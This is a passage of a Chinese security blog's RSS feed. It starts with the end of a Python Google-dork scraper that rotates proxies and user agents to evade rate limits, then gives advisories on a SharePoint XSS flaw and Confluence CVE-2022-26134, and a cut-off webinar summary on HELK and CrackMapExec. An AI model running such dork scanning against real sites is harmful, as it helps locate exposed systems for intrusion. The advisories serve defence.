&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;results&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;try_search_dork&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dork&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_agent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;results&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;results/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dork&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;_results.txt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;colored&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Saved top 20 results for dork &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dork&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;green&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;colored&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;No results found for dork &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dork&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;red&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;retries&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;backoff_factor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;retries&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uniform&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argparse&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-v&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--verbose&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Display errors with proxies.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;store_true&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parse_args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;dorks&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dorks.txt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;dorks&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;user_agents&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get_user_agents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;filter_working_proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_agents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;results&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;makedirs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;results&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ThreadPoolExecutor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;max_workers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;executor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;futures&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;executor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;search_dork&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dork&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_agents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dork&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dork&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dorks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;future&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;as_completed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;futures&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;future&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>SharePoint XSS漏洞技术分析与缓解措施</title>
        <link>http://localhost:1313/p/sharepoint-xss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/</link>
        <pubDate>Sat, 02 Aug 2025 15:40:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/sharepoint-xss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/</guid>
        <description>&lt;h1 id=&#34;sharepoint-xss漏洞&#34;&gt;SharePoint XSS漏洞
&lt;/h1&gt;&lt;p&gt;今天我们发布了安全公告983438，向客户通报SharePoint Server 2007和SharePoint Services 3.0中存在的跨站脚本(XSS)漏洞。以下是该漏洞的详细技术分析。&lt;/p&gt;
&lt;h2 id=&#34;攻击向量分析&#34;&gt;攻击向量分析
&lt;/h2&gt;&lt;p&gt;公告指出该漏洞可能导致SharePoint站点内的权限提升(EoP)。需要特别说明的是，这种权限提升并非从普通用户到工作站或服务器环境的管理员用户，而是攻击者可以在用户的SharePoint会话上下文中执行恶意脚本。最可能的攻击场景是：攻击者向已登录SharePoint服务器的用户发送恶意链接，当用户点击该链接时，攻击者嵌入的JavaScript将在点击者的用户上下文中执行。&lt;/p&gt;
&lt;h2 id=&#34;缓解措施&#34;&gt;缓解措施
&lt;/h2&gt;&lt;p&gt;SharePoint使用Http-Only cookies进行身份验证。由于HttpOnly cookies无法通过脚本访问，这显著降低了XSS攻击风险。更多信息请参考《使用HTTP-only Cookies缓解跨站脚本攻击》。&lt;/p&gt;
&lt;p&gt;IE8的XSS过滤器在Internet区域默认启用，能拦截此类XSS攻击，因此IE8用户面临的风险较低。但该过滤器在本地Intranet区域默认禁用，可通过以下UI界面启用：&lt;/p&gt;
&lt;p&gt;[图片：IE8 XSS过滤器启用界面]&lt;/p&gt;
&lt;p&gt;管理员也可以通过组策略为任何区域启用或禁用XSS过滤器，详见《组策略与Internet Explorer 8》。&lt;/p&gt;
&lt;h2 id=&#34;临时解决方案&#34;&gt;临时解决方案
&lt;/h2&gt;&lt;p&gt;我们建议通过服务器端ACL设置限制help.aspx文件的访问。启用此方案后，您将无法查看SharePoint站点内的帮助内容。实施此缓解措施的用户可访问以下英文帮助内容作为替代：
&lt;a class=&#34;link&#34; href=&#34;http://office.microsoft.com/en-us/sharepointserver/FX101211721033.aspx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://office.microsoft.com/en-us/sharepointserver/FX101211721033.aspx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Jonathan Ness, David Ross和Chengyun Chu，MSRC工程团队
&lt;em&gt;本文按&amp;quot;原样&amp;quot;提供，不作任何担保，也不授予任何权利。&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Atlassian Confluence Server和Data Center关键零日漏洞警报</title>
        <link>http://localhost:1313/p/atlassian-confluence-server%E5%92%8Cdata-center%E5%85%B3%E9%94%AE%E9%9B%B6%E6%97%A5%E6%BC%8F%E6%B4%9E%E8%AD%A6%E6%8A%A5/</link>
        <pubDate>Sat, 02 Aug 2025 15:29:09 +0800</pubDate>
        
        <guid>http://localhost:1313/p/atlassian-confluence-server%E5%92%8Cdata-center%E5%85%B3%E9%94%AE%E9%9B%B6%E6%97%A5%E6%BC%8F%E6%B4%9E%E8%AD%A6%E6%8A%A5/</guid>
        <description>&lt;h1 id=&#34;atlassian-confluence-server和data-center关键零日漏洞&#34;&gt;Atlassian Confluence Server和Data Center关键零日漏洞
&lt;/h1&gt;&lt;p&gt;软件公司Atlassian于6月2日发布公告，披露一个此前未知的关键漏洞(CVE-2022-26134)，即所谓的零日漏洞。该漏洞影响Atlassian Confluence Server和Confluence Data Center所有受支持版本。根据Atlassian声明，Atlassian Cloud不受影响。荷兰国家网络安全中心(NCSC-NL)发布公告将该漏洞评级为高/高风险。目前尚无可用补丁。&lt;/p&gt;
&lt;p&gt;该漏洞允许未经认证的攻击者远程执行代码并访问系统范围内的敏感信息。虽然Atlassian仍需确认最早受影响版本，但很可能所有版本均存在漏洞。目前公开渠道尚未出现概念验证代码。&lt;/p&gt;
&lt;p&gt;据发现该漏洞的安全公司Volexity称，此漏洞极易被利用。Volexity已确认存在有限范围内的漏洞利用活动。&lt;/p&gt;
&lt;h2 id=&#34;缓解措施&#34;&gt;缓解措施
&lt;/h2&gt;&lt;p&gt;Atlassian正在为受支持版本开发补丁(计划于太平洋时间6月3日下班前发布)。NCSC-NL建议补丁发布后立即安装。同时，Atlassian建议采取以下临时措施降低风险：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;限制从互联网访问Confluence Server和Data Center实例&lt;/li&gt;
&lt;li&gt;或完全禁用Confluence Server和Data Center实例直至补丁发布&lt;/li&gt;
&lt;li&gt;若无法实施上述措施，可部署Web应用防火墙(WAF)规则拦截包含&lt;code&gt;${&lt;/code&gt;的URL以降低风险&lt;/li&gt;
&lt;li&gt;建议实施网络监控&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Volexity已共享入侵指标(IOC)和YARA规则。NCSC-NL建议尽可能实施这些缓解措施，各组织需自行评估这些措施对业务流程的影响。NCSC-NL将持续监控情况并在官网更新相关信息。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>开源狩猎与对抗模拟的碰撞：HELK、Mordor与CrackMapExec技术解析</title>
        <link>http://localhost:1313/p/%E5%BC%80%E6%BA%90%E7%8B%A9%E7%8C%8E%E4%B8%8E%E5%AF%B9%E6%8A%97%E6%A8%A1%E6%8B%9F%E7%9A%84%E7%A2%B0%E6%92%9Ehelkmordor%E4%B8%8Ecrackmapexec%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 15:13:06 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BC%80%E6%BA%90%E7%8B%A9%E7%8C%8E%E4%B8%8E%E5%AF%B9%E6%8A%97%E6%A8%A1%E6%8B%9F%E7%9A%84%E7%A2%B0%E6%92%9Ehelkmordor%E4%B8%8Ecrackmapexec%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;专题讨论当开源狩猎遇上对抗模拟&#34;&gt;专题讨论：当开源狩猎遇上对抗模拟
&lt;/h3&gt;&lt;p&gt;Black Hills信息安全公司（BHIS）集结了开源软件（OSS）狩猎和对抗模拟领域的顶尖开发者，共同探讨当前技术格局与未来趋势。本次网络研讨会由Atomic Purple Team的Jordan Drysdale和PlumHound的Kent Ickler主持，特邀以下核心开发者参与：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Roberto Rodriguez&lt;/strong&gt; (@Cyb3rWard0g) 与 &lt;strong&gt;Nate Guagenti&lt;/strong&gt; (@neu5ron)：HELK项目核心维护者，专注Mordor数据集、Azure资源管理器模板开发&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Marcello Salvati&lt;/strong&gt; (@byt3bl33d3r)：CrackMapExec和SILENTTRINITY开发者&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;John Strand&lt;/strong&gt; (@strandjs)：对抗模拟领域资深专家&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;关键技术议题&#34;&gt;关键技术议题
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;威胁情报共享体系&lt;/strong&gt;（00:14:26）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;探讨Mordor Labs标准化威胁数据集的构建（01:10:05）&lt;/li&gt;
&lt;li&gt;演示如何通过Jupyter Notebook分析Windows攻击日志（https://mordordatasets.com/notebooks/small/windows/windows.html）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;HELK威胁分析平台&lt;/strong&gt;（01:12:42）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于ELK堆栈的扩展架构&lt;/li&gt;
&lt;li&gt;集成攻击技战术知识库（MITRE ATT&amp;amp;CK）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;对抗模拟工具链&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CrackMapExec在内网渗透中的实战应用&lt;/li&gt;
&lt;li&gt;SILENTTRINITY后期利用框架设计&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;威胁狩猎实战手册&lt;/strong&gt;（01:18:41）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开源威胁研究（Open Threat Research）方法论&lt;/li&gt;
